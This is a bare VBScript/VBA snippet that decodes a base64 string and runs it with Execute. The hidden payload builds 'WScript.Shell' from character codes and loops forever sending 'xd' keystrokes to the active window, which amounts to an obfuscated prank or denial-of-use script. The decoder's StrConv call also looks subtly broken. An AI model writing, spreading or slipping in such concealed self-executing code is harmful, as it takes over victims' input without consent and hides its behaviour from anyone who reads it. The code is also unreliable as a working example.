Function d(b)
    Set x=CreateObject("Msxml2.DOMDocument.3.0")
    Set n=x.createElement("b64")
    n.dataType="bin.base64"
    n.text=b
    d=StrConv(n.nodeTypedValue,1)
End Function
Execute d("U2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KENocigmSDU3KSZDaHIoJkg1MykmQ2hyKCZINjMpJkNocigmSDcyKSZDaHIoJkg2OSkmQ2hyKCZINzApJkNocigmSDc0KSZDaHIoJkgyRSkmQ2hyKCZINTMpJkNocigmSDY4KSZDaHIoJkg2NSkmQ2hyKCZINkMpJkNocigmSDZDKSkKRG8Kc2hlbGwuU2VuZEtleXMgQ2hyKCZINzgpJkNocigmSDY0KQpMb29w")
